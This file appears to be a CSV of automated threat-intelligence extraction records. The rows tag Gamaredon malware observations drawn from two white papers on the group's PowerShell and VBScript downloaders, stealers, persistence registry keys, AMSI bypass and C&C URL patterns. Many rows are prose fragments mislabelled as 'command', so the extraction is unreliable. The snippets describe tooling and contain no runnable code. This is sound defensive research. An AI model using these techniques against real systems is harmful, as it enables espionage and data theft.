1.0.0,actor--gamaredon,artifact--sha256:32d87daa0332e6dcec3374084e9215d65fbe225ee638052307984a85e0e2d37d,observation--sha256:36ff060a1ff384b6411a41f045f5da585be92732c5fb629efc52cd0345ddb1c0,command,"PowerShell , and is reported on in both of our previous Gamaredon white papers . On March 17th, 2025, we","PowerShell , and is reported on in both of our previous Gamaredon white papers . On March 17th, 2025, we",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 16. An example of a PteroVDoor decryptor Persistence PteroVDoor instances observed until May 31st, 2025 ensure persistence via the HKCU Run key with the registry value named GooglePhone . The instances observed between May 31st, 2025 and September 18th, 2025 don’t use any persistence mechanisms. And the instances observed after September 18th, 2025 are persisted via the PteroVDoor decryptor, which loads them ",
1.0.0,actor--gamaredon,artifact--sha256:7964d0be0d485c78aeb56a287ec37aededb6a022a95f6348087b23d1dffd0170,observation--sha256:df07fbfc9496e4dc9752e30a584ec10c5cb75c29813438c3d34a2957f9a2882b,command,"PowerShell command. This command downloads a payload from the hardcoded C&C IP address, splits it","PowerShell command. This command downloads a payload from the hardcoded C&C IP address, splits it",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:ac79beeec62c3311bb2c63d256febd5185b8a5b47ce42674904617f20e8a7564,observation--sha256:2341176fe2e9e688c93cb5cf1765eb27042c44196d8c00527cd2dcc3810402dd,command,PowerShell commands.,PowerShell commands,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:ac79beeec62c3311bb2c63d256febd5185b8a5b47ce42674904617f20e8a7564,observation--sha256:9e20b1833dc7f8528739cc098c598ff54e8b102f590b439cd032f17305e29e89,command,PowerShell commands.,PowerShell commands,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:42ab43e5fd8c358b27ee99c50b45b6a6a373af8d1f9e09516cbe25ec0399470b,observation--sha256:1d515b70d9265c97498bd0a8315065f667519cc955c03f3a50920798d062643b,command,PowerShell loader from a random registry value under HKCU\Cursors . This loader executes the initial part,PowerShell loader from a random registry value under HKCU\Cursors . This loader executes the initial part,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:0d774f93d49bd62b90eb21b9d6b7b24db138e78e60bbefc6f20cb2ff7d4917ba,observation--sha256:e84aae85619ef7de479a055497a3189cc72d28338817f45b0bd8aa8ab531f582,command,PowerShell loader wrapped in VBScript in the Startup directory with a randomly generated .vbs,PowerShell loader wrapped in VBScript in the Startup directory with a randomly generated .vbs,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:053ec5a894789ea0291d915a90c6a4922f688f183bb502a7dc3ae1b321811b50,observation--sha256:cd93d05a86437cbac0bf22afcc64e65c793c74992d4951d710924ffdfcb67711,command,"PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the","PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Obfuscation To avoid detection and to make it more difficult for researchers to dissect its malware, Gamaredon often applies obfuscation to its tools. Most of Gamaredon ’s currently used tools a re scripts written in PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the most common types of obfuscation used in Gamaredon ’s tools . Note that there are myri",
1.0.0,actor--gamaredon,artifact--sha256:e1a938cb1ac9de8aba10ad14657831aededcb2dd515b70eaad555d5bfa802065,observation--sha256:a7badd4b8e6ed938e28c7285f7857fdb4f156da1f4bd5c576ced0423209838b7,command,PowerShell payload via the,PowerShell payload via the,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:6367e3c1ac1e31a0096870dd854e5fe54c3caec2dfbdf007a38bca459fd92fae,observation--sha256:e9bf6cae2da6b1882faa83f39e34796db1c57484450e243d500103a1600b4e35,command,"PowerShell payload via the Telegra.ph API , and runs it in memory.","PowerShell payload via the Telegra.ph API , and runs it in memory",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:30a206de5488a8e13f7ec123768436c8c07b85587e9c04940bd10c1d78e340a2,observation--sha256:ca0feae63547b3d470f3ff6ffa747bc75f725dc7ce41d1b47798c014ece5a167,command,PowerShell payloads.,PowerShell payloads,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:dfcfb17cf772eb29a9549428cf46d0911ada2e38077e2e9d4a618a8b77e2c97a,observation--sha256:0a3a82a84349345f0de3497509ab6785fa7a64c69615178c2fed13bdbfa7f6d9,command,PowerShell payloads. PteroEffigy does not use any persistence mechanism and is executed in memory,PowerShell payloads. PteroEffigy does not use any persistence mechanism and is executed in memory,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:7e651a2379bd3b4f169a7607b75d200c30edc294bf2c314108d9016bb46a8870,observation--sha256:5f60b62d052d62d66d4acad1ccd567fca53ae7ea9254d05e3d3ef928d8df40f4,command,PowerShell processes with hidden,PowerShell processes with hidden,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:b01db8d7e8224ab4466dd20626af796dca640663901697d537fdfb554f26b324,observation--sha256:1fb6c9aaa23305028d7f27971702372410389941ef277b8996a5423889a103b3,command,PowerShell script from a hardcoded IP address using an HTTP GET request with the URI /cmd . Then it,PowerShell script from a hardcoded IP address using an HTTP GET request with the URI /cmd . Then it,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:5dbf661afecc117e7cd5d72ea7964de61dc30ccfad762a36e5d708c1ac98748f,observation--sha256:5fa0f8649db22ea60de8f120b01775e5916e5bc30e98a76a19fbfda25552ea2d,command,PowerShell tool providing partial SO CKS proxy functionality. It consists of two parts that were taken,PowerShell tool providing partial SO CKS proxy functionality. It consists of two parts that were taken,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:f89729a229e449262f71267713508ed9a85ddca6d51d974f014e20c01dc92bbd,observation--sha256:138ed8226211db4c36deb76e37ccce1adde03bb01bbf26c27d757921adee855a,command,"PowerShell version of PteroLNK, is simplified and doesn’t use any persistence or update mechanism due","PowerShell version of PteroLNK, is simplified and doesn’t use any persistence or update mechanism due",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:18b8eb3f9af32afadce524ff015010203c908a810f2f6948909528dc0e8b7a2b,observation--sha256:464f898d16d596b489694904e219690afd6840d16019a3637934fd88e058aa57,command,"Powershell repository, tries to bypass AMSI on a compromised machine by patching the","Powershell repository, tries to bypass AMSI on a compromised machine by patching the",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:fd2f7a411464c5cb2efc1bd3471354d45dccfa64431dfc91b552285a405e2313,observation--sha256:ccc59eeb5518e9eb51fbdb6474cd889defc94a350c839cef3274937a0f26a72f,command,PteroBleed Stealer PowerShell Exfiltrates data stored by specific web application s.,PteroBleed Stealer PowerShell Exfiltrates data stored by specific web application s,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:a0bf0dbc72c8c7160fd41466f9b9e8df091d39bf535573ee38745e16860ddbef,observation--sha256:0057fd7091c0ea5a3a1e18c5e9f418e114aadaa11b079fe8de024ea26a03353b,command,PteroCache Downloader July 2025 PowerShell Downloads other Gamaredon tools.,PteroCache Downloader July 2025 PowerShell Downloads other Gamaredon tools,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:985afde9a7b1a7514b3872b8980a0e50d59ce9673e02eac807e154313ecd461f,observation--sha256:f68e12151788c35875860ecafaf05dabfa84a02260bb86b88eb0b3e0a1d8b32d,command,PteroClone Ad hoc PowerShell Delivers payloads using the rclone utility.,PteroClone Ad hoc PowerShell Delivers payloads using the rclone utility,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:ef2ea286005ee263b261220cb785acc4e14eb9df232dbe54d8c7118dadeebc58,observation--sha256:357b38c2add1c4318fcd510b56a6cbbfb22cab67d3f033c326df750582bfff6c,command,PteroCookie Stealer PowerShell Exfiltrates cookies stored by browsers.,PteroCookie Stealer PowerShell Exfiltrates cookies stored by browsers,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:e695d1d394d43a7989341d971b0ef431561d3d6f84e83b4ea2684912b7d1c5b9,observation--sha256:9d365794303d83d0faafd5b94c8c4b9a9ce4261e01c5e8d448ccdce03e64703c,command,PteroDee Downloader February 2025 PowerShell Downloads other Gamaredon tools.,PteroDee Downloader February 2025 PowerShell Downloads other Gamaredon tools,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:c15d1d9ec1f2b1133b3fcba0a16f9fe30311554c35cd55d8dcac169f9d0ae956,observation--sha256:3cdfaaf03963b8107b664a6b95d202f634a4f5cf4d46eaa2846f021ba61febb8,command,PteroDee can fetch and execute up to 10 PowerShell payloads from a hardcoded C&C server. PteroDee,PteroDee can fetch and execute up to 10 PowerShell payloads from a hardcoded C&C server. PteroDee,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 3. PteroDee (prettified) We saw this tool for the last time on August 4th, 2025; it was most likely discontinued, and perhaps replaced with PteroCache , which Gamaredon started deploying regularly from July 31st, 2025 onward. Capabilities PteroDee can fetch and execute up to 10 PowerShell payloads from a hardcoded C&C server. PteroDee expects any response it receives to be a PowerShell script – which is then i",
1.0.0,actor--gamaredon,artifact--sha256:812e7a6917a8496d00f93c985c3c2d03becb24e91a6758d90a6e27312975b74b,observation--sha256:2aec571bfa6f4ae0324e3e0c02343c85be68d5059f2a9e5bd9b207247685704d,command,"PteroDig , PteroScreen , and PteroLNK PowerShell version . All of them are described in detail later in this","PteroDig , PteroScreen , and PteroLNK PowerShell version . All of them are described in detail later in this",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:56e3b0c9857db7995295d99baaa06563e08246b9dd0035bdf8487a2f97ad2162,observation--sha256:a83279eed2f8ccffeffbbd016bdd90cdb2457134c97b3292c109fec1ece9097e,command,PteroDig Weaponizer PowerShell Weaponizes LNK files.,PteroDig Weaponizer PowerShell Weaponizes LNK files,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:2e0829a51b05e669a2d603dac9e41edb253b915bd97350885d2e9675632a9fb0,observation--sha256:1aa580bdf865dfd7f99cbcb6cc139b5283f328af4e81cba465aba411b3f34882,command,PteroDum Downloader February 2025 PowerShell Downloads other Gamaredon tools.,PteroDum Downloader February 2025 PowerShell Downloads other Gamaredon tools,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:049c1aa1c4da5e791c78cce0faf869eada6e0f44dfef5297aa38f8459745894f,observation--sha256:e77aa1220b4fb4a3ba8d1bd0e0a08d2ec1f42d4e130aae820d9bfa1d8dbff781,command,"PteroDum, shown in Figure 4, is another simple PowerShell downloader that we also discovered on","PteroDum, shown in Figure 4, is another simple PowerShell downloader that we also discovered on",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 3. PteroDee (prettified) We saw this tool for the last time on August 4th, 2025; it was most likely discontinued, and perhaps replaced with PteroCache , which Gamaredon started deploying regularly from July 31st, 2025 onward. Capabilities PteroDee can fetch and execute up to 10 PowerShell payloads from a hardcoded C&C server. PteroDee expects any response it receives to be a PowerShell script – which is then i",
1.0.0,actor--gamaredon,artifact--sha256:7037488aca09e1c235b74de4e820e933fb7b49bf41919553932765ab0b5855bf,observation--sha256:dadaaf910fd0f718ea5bc16b1faa27bfee959823edcc65a8863693f7a97f5bc0,command,PteroEffigy Downloader March 2025 PowerShell Downloads other Gamaredon tools.,PteroEffigy Downloader March 2025 PowerShell Downloads other Gamaredon tools,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:c1673a6c4ed8613bb20e88fa3e98e2efd76fa600b8a2b8a3194a073b6197209b,observation--sha256:ba670a543d283a7af0b5d35be66700bb183271eb4e87f3a94163afa1d3d7f23a,command,"PteroEffigy, which we discovered on March 5th, 2025, is yet another PowerShell downloader (see Figure 11).","PteroEffigy, which we discovered on March 5th, 2025, is yet another PowerShell downloader (see Figure 11",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:3143f8052cfad981441ff1ebf19cb6295c8d063c24b7371a3436daeec17a1009,observation--sha256:56c2e73910fa2c5191806db0ac3ca557f3595a44bdfb84f6d9664bb4491f4ea4,command,PteroGram Infostealer June 2023 PowerShell Exfiltrates data stored by the Telegram,PteroGram Infostealer June 2023 PowerShell Exfiltrates data stored by the Telegram,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:2b62ec6907c9aa8d492ed50cbecc8b40e5b78503053b38d120f9c3ea722ae3e0,observation--sha256:84a142ece0a4642e0dc6281cecfdf58aab0a9937440d415f64d0974ccfe23940,command,PteroGram Stealer PowerShell Exfiltrates data stored by the Telegram application.,PteroGram Stealer PowerShell Exfiltrates data stored by the Telegram application,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
